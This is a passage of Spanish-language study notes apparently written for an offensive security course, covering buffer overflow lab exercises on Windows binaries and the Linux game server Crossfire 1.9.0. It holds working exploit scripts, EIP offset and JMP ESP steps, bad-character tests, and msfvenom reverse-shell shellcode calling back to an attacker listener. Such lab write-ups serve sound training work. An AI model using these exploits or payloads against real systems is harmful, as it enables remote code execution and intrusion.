m4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co
```

Ahora introducimos esta cadena en nuestro exploit.txt mediante nuestro siguiente script:

```
> msf-pattern_create -l 2000
badchars = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co"


f = open("exploit.txt", "wb")
f.write(badchars)
f.close()
```


Lanzamos de nuevo nuestro programa con el exploit.txt anterior y revisamos el EIP, se ha sobreescrito con el número *43346943*. Así ahora con otra herramienta de también el kit de metasploit buscamos la localización exacta del comienzo del patrón anterior.

```
> msf-pattern_offset -l 2000 -q 43346943
[*] Exact match at offset 1812
```

Así, obtenemos que el buffer se sobreescribe exactamente en el byte 1812 (y recordamos tiene un espacio para cuatro bytes). De esta forma, ahora que tenemos la localización del EIP y además tenemos la seguridad de que este es sobreescribible localizemos la dirección de la función *flag()* para colocarla como valor del registro EIP.

Por otra parte, explorando el código en el immunity debugger podemos observar que la flag se muestra a partir del siguiente pedazo de código:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230225115415.png' | relative_url }}" text-align="center"/>
</div>

(Observemos que el bloque de código que se ejecuta es aquel que está entre dos flechitas con lo que primero coge la flag; fgets  y luego la muestra fprintf).

Que comienza con la instrucción contenida en la dirección *00401530*. De esta forma, manipulamos el contenido de la EIP para redirigir el flujo de ejecución de la aplicación sobre esa función. De esta forma, modificamos el contenido del script de python anterior de la siguiente forma;

```
buffer = b"A"*1812
address = b"\x30\x15\x40\x00"

exploit = buffer + address

f = open("exploit.txt", "wb")
f.write(exploit)
f.close()
```

Sin embargo, el script anterior no nos da la respuesta adecuada porque no posee la flag y salta a una función distinta:

```
Utilize the BOF to jump directly to flag() to display the flag.

Reading in contents of 'exploit.txt' in the local directory.

Your input that was saved into memory is as follows:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAé§@

Copying your input into the vulnerable buffer.
Returning from the vulnerable function (vuln()).

Great job! You solved this challenge, but the flag is missing.
All you need to do now is repeat this solution on the server to get the real flag.
Press any key to continue...
```

Así pues con el mismo fichero exploit.txt escribimos:

```
cat exploit - | nc <IP> 5000
```

##### 2.3.3. Getting a Shell.

**4.  Es hora de probar su capacidad para generar shellcode. Para ayudar en este proceso, hemos creado un servicio de Windows de 32 bits que se ejecuta sobre la VM n.º 1 que ejecuta directamente cualquier entrada que recibe (incluso maneja la conversión de cadenas a bytes sin formato). Simplemente necesita generar un código de shell y copiar/pegar para la ejecución instantánea del comando/Conéctese a la VM n.º 1 en el puerto 5000, envíe a este servicio un código de shell y lea flag.txt para resolver este desafío. Recuerde presionar ENTER una vez conectado al servidor, para obtener el banner de inicio de sesión y el shellcode de entrada.

NOTA 1: Si bien puede usar cualquier carga de código de shell adecuada para la arquitectura y el sistema operativo que desee localmente, le recomendamos que use solo cargas útiles de ejecución de comandos que no estén basadas en la red en el servidor (como simplemente ejecutar cmd.exe _)_ . Algunas cargas útiles basadas en la red (como windows/shell_rev_tcp) no siempre funcionan correctamente en el servidor. También intente evitar los malos caracteres comunes al generar el código shell como '\\x00'.

NOTA 2: se esperan algunos errores como **000d:err:menubuilder:init_xdg al buscar el directorio del escritorio** debido a restricciones de privilegios de escritura en este shell. Los dejamos en (errores activados) para que aún reciba los errores de su terminal (por ejemplo, cuando usa un comando incorrecto) y para ayudar en la depuración (por ejemplo, si su shellcode está roto).

En este caso se nos comunica que existe un servicio en el puerto 5000 de la máquina de destino. Según nos informa el enunciado, este servicio ejecuta cualquier input que recibe.

De esta forma con un script de python podríamos intentar hacer que el servicio ejecutará un stream de bytes que conformen un shellcode. En primer lugar, generamos un shellcode a través de msfvenom:

```
> msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.200 LPORT=4444 -b "\x00"
```

Y copiamos el código nos conectamos al servicio a través de Netcar y pegamos el codigo y pulsamos ENTER. Obtendremos una shell y cogeremos la flag en un listener de netcat que deberemos abrir previamente. 

<br />

**5.  Por lo tanto, puede copiar y pegar shellcode, pero ningún servicio real manejaría la conversión de shellcode en bytes sin procesar. Esta vez, debe enviar bytes sin procesar al servicio para aterrizar su caparazón y obtener la bandera. Cuando esté listo, envíe su carga útil a la VM n.º 2 en el puerto 5000 con la siguiente sintaxis: `cat raw_shellcode.txt - | nc [VM#2 IP] 5000`

NOTA: Se aplican las mismas reglas de código de referencia de referencia que en el desafío anterior, así que simplemente reutilice la misma carga útil para hacer su vida más fácil pero en forma de bytes sin procesar.

Así, empleamos el siguiente script para conforma el 'exploit.txt' 

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.200 LPORT=4444 -f py -v badchars -b "\x00" 
```

<br />

```
#!/usr/bin/python

badchars =  b""
badchars += b"\xdb\xc6\xba\x78\x0d\xfd\x7e\xd9\x74\x24\xf4"
badchars += b"\x5e\x33\xc9\xb1\x52\x31\x56\x17\x83\xee\xfc"
badchars += b"\x03\x2e\x1e\x1f\x8b\x32\xc8\x5d\x74\xca\x09"
badchars += b"\x02\xfc\x2f\x38\x02\x9a\x24\x6b\xb2\xe8\x68"
badchars += b"\x80\x39\xbc\x98\x13\x4f\x69\xaf\x94\xfa\x4f"
badchars += b"\x9e\x25\x56\xb3\x81\xa5\xa5\xe0\x61\x97\x65"
badchars += b"\xf5\x60\xd0\x98\xf4\x30\x89\xd7\xab\xa4\xbe"
badchars += b"\xa2\x77\x4f\x8c\x23\xf0\xac\x45\x45\xd1\x63"
badchars += b"\xdd\x1c\xf1\x82\x32\x15\xb8\x9c\x57\x10\x72"
badchars += b"\x17\xa3\xee\x85\xf1\xfd\x0f\x29\x3c\x32\xe2"
badchars += b"\x33\x79\xf5\x1d\x46\x73\x05\xa3\x51\x40\x77"
badchars += b"\x7f\xd7\x52\xdf\xf4\x4f\xbe\xe1\xd9\x16\x35"
badchars += b"\xed\x96\x5d\x11\xf2\x29\xb1\x2a\x0e\xa1\x34"
badchars += b"\xfc\x86\xf1\x12\xd8\xc3\xa2\x3b\x79\xae\x05"
badchars += b"\x43\x99\x11\xf9\xe1\xd2\xbc\xee\x9b\xb9\xa8"
badchars += b"\xc3\x91\x41\x29\x4c\xa1\x32\x1b\xd3\x19\xdc"
badchars += b"\x17\x9c\x87\x1b\x57\xb7\x70\xb3\xa6\x38\x81"
badchars += b"\x9a\x6c\x6c\xd1\xb4\x45\x0d\xba\x44\x69\xd8"
badchars += b"\x6d\x14\xc5\xb3\xcd\xc4\xa5\x63\xa6\x0e\x2a"
badchars += b"\x5b\xd6\x31\xe0\xf4\x7d\xc8\x63\x3b\x29\xff"
badchars += b"\xbb\xd3\x28\xff\x2a\x78\xa4\x19\x26\x90\xe0"
badchars += b"\xb2\xdf\x09\xa9\x48\x41\xd5\x67\x35\x41\x5d"
badchars += b"\x84\xca\x0c\x96\xe1\xd8\xf9\x56\xbc\x82\xac"
badchars += b"\x69\x6a\xaa\x33\xfb\xf1\x2a\x3d\xe0\xad\x7d"
badchars += b"\x6a\xd6\xa7\xeb\x86\x41\x1e\x09\x5b\x17\x59"
badchars += b"\x89\x80\xe4\x64\x10\x44\x50\x43\x02\x90\x59"
badchars += b"\xcf\x76\x4c\x0c\x99\x20\x2a\xe6\x6b\x9a\xe4"
badchars += b"\x55\x22\x4a\x70\x96\xf5\x0c\x7d\xf3\x83\xf0"
badchars += b"\xcc\xaa\xd5\x0f\xe0\x3a\xd2\x68\x1c\xdb\x1d"
badchars += b"\xa3\xa4\xeb\x57\xe9\x8d\x63\x3e\x78\x8c\xe9"
badchars += b"\xc1\x57\xd3\x17\x42\x5d\xac\xe3\x5a\x14\xa9"
badchars += b"\xa8\xdc\xc5\xc3\xa1\x88\xe9\x70\xc1\x98"

f = open("exploit.txt", "wb")
f.write(badchars)
f.close()
```


##### 2.3.4. Improving your exploit.

**2.  No más pasos; ¡es hora de ponerlo todo junto! En la VM n.° 1, descargue el programa en http://VM#1_IP/vuln-app-windows.exe, que es vulnerable a un desbordamiento de búfer. Una vez que se haya probado con su cliente de Windows y tenga un exploit funcional, puede probarlo con la IP de la VM n.º 1 en el puerto 5000 y leer el indicador.**

NOTA: Si bien puede usar cualquier carga de código de shell adecuada para la arquitectura y el sistema operativo que desee localmente, le recomendamos que use solo cargas útiles de ejecución de comandos que no estén basadas en la red en el servidor (como simplemente ejecutar cmd.exe). Algunas cargas útiles basadas en la red (como windows/shell_rev_tcp) no siempre funcionan correctamente en el servidor. También intente evitar los malos caracteres comunes al generar el código shell.

En primer lugar descargamos la aplicación vulnerable, esta toma como input el contenido de un fichero llamado 'exploit.txt' que se encuentra en la misma localización que el ejecutable y lo procesa.

Así, formamos un archivo 'exploit.txt' con el siguieente script de python:

```
#!/usr/bin/python3

buffer=b"A"*2000

f = open("exploit.txt","wb") #Escribimos en binario sobre el fichero.
f.write(buffer)
f.close()
```

Vinculamos el ejecutable a immunity debugger y lo iniciamos obteniendo que el programa termina abruptamente y que la dirección del registro EIP se ha sobrescrito.

Así, procedemos a obtener la localización exacta del EIP, para ello formamos una cadena de bloques de caracteres no repetidos con la herramienta del kit de metasploit:

```
msf-pattern_create -l 2000
```

Y copiamos esta cadena como bites en exploit.txt usando el script anterior y llevamos el fichero 'exploit.txt' sobre el cliente de windows. Observamos que el EIP ha quedado sobreescrito con el número *69433169* ahora, empleamos para localizar el offset inicial del registro EIP  

```
> msf-pattern_offset -l 2000 -q 69433169
[*] Exact match at offset 1804
```

Así, ahora sabemos el inicio exacto del comienzo de la sobreescritura del EIP y por tanto tenemos control del flujo de ejecución de la aplicación. 

De esta forma, también sabemos que el código que queda después de la sobreescritura del EIP pasa al registro ESP tal y como podemos ver con el siguiente código de python:

```
> cat badchars.py 
#!/usr/bin/python3

buffer = b"A"*1804 

eip = b"B"*4

esp = b"C"*500

exploit = buffer + eip + esp

f = open("exploit.txt", "wb")
f.write(exploit)
f.close()
```

Este script añade 'A's hasta el EIP que sobreescribe con 'B's y luego escribe 'C's, al procesar el fichero exploit.txt creado por este script en la aplicación vulnerable observamos en Immunity Debugger que:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230225182042.png' | relative_url }}" text-align="center"/>
</div>

Podemos observar que el registro ESP a almacenado una cadena de caracteres compuestas por C, es decir, ha procesado el input posterior a la sobreescritura del EIP. De esta forma, ya conocemos la localización de nuestro shellcode, el registro ESP sólo queda obtener una instrucción con la que saltar al mismo.

Para ello buscamos con *mona* modulos que se ejecuten con el código del programa con la finalidad de encontrar uno sin protección adecuada cuyo código procese una instrucción de salto al registro ESP. Así, buscamos módulos con: *!mona modules* en la barra blanca inferior

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230225190802.png' | relative_url }}" text-align="center"/>
</div>

Antes de ello hay que asegurarse de que tenemos instalado el modulo mona. Nos descargamos [mona](https://github.com/corelan/mona) y ponemos el modulo de python sobre la carpeta de scripts de python del Immunity Debugger; *C:\\Program Files (x86)\\Immunity Inc\\Immunity Debugger\\PyCommands* 

Acto seguido buscamos módulos que se ejecuten con la aplicación pero desgraciadamente no hay ninguno salvo el ejecutable de la aplicación en si:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230225184827.png' | relative_url }}" text-align="center"/>
</div>

De esta forma, buscamos en la aplicación instrucciones de salto a ESP, recordemos que para buscar una instrucción hay que buscarla a través de sus bytes en hexadecimal: \\xff\\xe4.

```
!mona find -s \xff\xe4 -m vuln-app-windows.exe
```

Afortunadamente encontramos dos punteros, escogemos aquel que tiene PAGE_EXECUTE_READ permissions:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230225191040.png' | relative_url }}" text-align="center"/>
</div>

Así, la dirección del EIP es 0x148011a8.

Como paso final, comprobemos los badchars con el siguiente script de python:

```
#!/usr/bin/python3

badchars = b""
badchars += b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
badchars += b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
badchars += b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
badchars += b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
badchars += b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
badchars += b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
badchars += b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
badchars += b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
badchars += b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
badchars += b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
badchars += b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
badchars += b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
badchars += b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
badchars += b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
badchars += b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
badchars += b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

exploit = b"A"*1804 + b"\xa8\x11\x80\x14" + badchars   

f = open("exploit.txt","wb")
f.write(exploit)
f.close()
```

Como hemos hecho en casos anteiores, buscamos sobre el registro ESP después de haber ejecutado la aplicación con el exploit.txt asociada al debugger para comprobar qué a partir del '\\x19' el resto de bytes se corrompe. 

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230225230621.png' | relative_url }}" text-align="center"/>
</div>

De forma que ya sabemos que \\x1a es un badcharacter. Así, lo quitamos de la lista anterior y volvemos a crear el exploit.txt (sin \\x1a) y volvemos a lanzar la aplicación. Con este método obtenemos que los badchars de la aplicación son: "\\x00\\x1a\\x". 

<br />

### 3. Linux Buffer Overflows.

En este modulo nos introduciremos en la explotación de Linux Buffer Overflow explotando Crossfire, una aplicación de Linux.

Crossfire 1.9.0 es vulnerable a un BOF network-based cuando se pasa un input superior a 4000 bytes a través del comando *setup sound*. Para realizar un debugg sobre la aplicación empleamos Evans Debugger.

Los kernels y compiladores de Linux recientes han implementado varias técnicas de protección de la memoria, como *Data Execution Prevention* (DEP), *Address Space Layout * (ASLR), y *Stack Canaries*.

Dado que la omisión de estos mecanismos de protección está más allá del alcance de este módulo, nuestra versión de prueba de Crossfire se ha compilado sin protección contra destrucción de pila (canarios de pila), ASLR y DEP.

<br />

#### 3.1. Replicating the Crash.

Nuestro entorno de testeo consiste en un cliente Debian en el que ejecutaremos y depuraremos (debug) una aplicación.

En primer lugar, suponemos que tenemos instalada esta aplicación:

```
root@debian:~# cd /usr/games/crossfire/bin/

root@debian:/usr/games/crossfire/bin# ./crossfire
...
Welcome to CrossFire, v1.9.0
Copyright (C) 1994 Mark Wedel.
Copyright (C) 1992 Frank Tore Johansen.

---------registering SIGPIPE
Initializing plugins
Plugins directory is /usr/games/crossfire/lib/crossfire/plugins/
 -> Loading plugin : cfanim.so
CFAnim 2.0a ini
CFAnim 2.0a post init
Waiting for connections...
```

Una vez la aplicación se ejecute aceptará conexiones de red. Ahora iniciamos nuestro debugger 'edb':

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230224092315.png' | relative_url }}" text-align="center"/>
</div>

Utilizamos *Attach* > *File* y elegimos el PID de nuestra aplicación:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230224092607.png' | relative_url }}" text-align="center"/>
</div>

Como ya sabemos al vincular el proceso al debugger este paraliza su ejecución con lo que debemos reanudarla dando click sobre el botón *Run*:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230224092656.png' | relative_url }}" text-align="center"/>
</div>

Ahora que tenemos la aplicación ejecutándose y vinculada al debugger repliquemos el crasheo que tendría lugar dada la vulnerabilidad subyacente de BOF.

Para este propósito empleamos el siguiente código de python:

```
#!/usr/bin/python
import socket

host = "10.11.0.128"

crash = "\x41" * 4379

buffer = "\x11(setup sound " + crash + "\x90\x00#"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[*]Sending evil buffer..."

s.connect((host, 13327))
print s.recv(1024)

s.send(buffer)
s.close()

print "[*]Payload Sent !"
```

Observemos que en definitiva nos estamos conectando al servicio sobre un determinado puerto y estramos enviando un input muy específico tanto en su estructura como en la longitud Se necesita que contenga unos bytes hexadecimales tanto al comienzo como al final del envío tal y como se puede apreciar en la variable *buffer*. 

Al mandarlo recibimos el siguiente mensaje de error 

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230224104207.png' | relative_url }}" text-align="center"/>
</div>

El mensaje de error nos informa de que una dirección no ha podido ser encontrada con lo que podemos asumir que el EIP ha sido sobrescrito y que la aplicación se ha parado debido a que no ha encontrado la siguiente instruccióna ejecutar desplegando el mensaje de error que hemos visto anteriormente.

<br />

#### 3.2. Controlling EIP.

Ahora que estamos en un punto en el que sabemos que la EIP es susceptible de ser sobreescrita por un desbordamiento del búfer debemos encontrar la localización exacta del offset de inicio de sobreescritura del EIP en nuestro input.

Para ello emplearemos las herramientas del kit de Metasploit *msf-pattern_create* y *msf-pattern_offset*.

Sabemos que el EIP se sobreescribe con al menos un input de longitud 4379, de forma que generamos una cadena de bloques de cuatro bytes no repetidos con una longitud de al menos 4379 bytes y la mandamos sobre el servicio. 

```
kali@kali:~$ msf-pattern_create -l 4379
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6A
```

Seguidamente comprobamos el valor del EIP y buscamos el valor del mismo en nuestra cadena:

```
kali@kali:~$ msf-pattern_offset -q 46367046
[*] Exact match at offset 4368
```

Ahora tenemos control sobre el contenido del EIP y podemos utilizar este para controlar el flujo de ejecución de la aplicación tras el crasheo.

<br />

**Exercises**

**3.  Ahora es el momento de practicar el control de EIP, estilo _Linux_ . Solo necesita sobrescribir EIP para apuntar a la dirección de memoria de la función _flag()_ dentro del binario que encuentra en la VM #1 en http://\[VM#1_IP]/execution-flow-linux para obtener la bandera. Al igual que con los desafíos de Windows, este binario lee desde 'exploit.txt' de forma predeterminada localmente y desde STDIN (el socket) en el servidor. Tampoco obtiene una copia del código fuente o una plantilla para ayudar (pero no los necesitaba de todos modos). Una vez que esté listo, inicie su explotación sin procesar contra el puerto 5000 en la VM n. ° 1 para resolver este desafío y obtener la bandera.**

En primer lugar instalamos el debugger de linux edb con:

```
sudo apt-install edb-debugger
```

Seguidamente, descargamos el binario y le damos permisos de ejecución:

```
curl http://192.168.197.52/execution-flow-linux --output execution-flow-linux

chmod +x execution-flow-linux
```

Lo ejecutamos en la terminal y obtenemos el siguiente mensaje:

```
> ./execution-flow-linux 
*******************************************************************************
*********************  Welcome to Execution Flow: Linux  **********************
*******************************************************************************

Utilize the BOF to jump directly to flag() to display the flag.

Reading in contents of 'exploit.txt' in the local directory.

Error: 'exploit.txt' missing. Exiting program.
If you want to read from STDIN (the command line) instead, run with:
./{{program_name}} server
```

De nuevo, tenemos una aplicación vulnerable a BOF que coge como input el contenido del fichero 'exploit.txt' en el mismo directorio y lo procesa. Nuestro objetivo es aprovecharnos de esta vulnerabilidad para redirigir el flujo de ejecución de la aplicación y conseguir que se ejecute una función contenida en el código del binario que de otra forma no se llegaría a ejecutar.

Así, en primer lugar verificamos la existencia de esta vulnerabilidad tratando de sobreescribir el contenido del registro EIP introduciendo un input lo suficientemente grande.

Utilizamos el siguiente código en Python:

```
#!/usr/bin/python3

buffer = b"A"*2000

f = open("exploit.txt","wb")
f.write(buffer)
f.close()
```

abrimos el debugger y lo vinculamos al proceso *File* > *Open* > execution-flow-linux
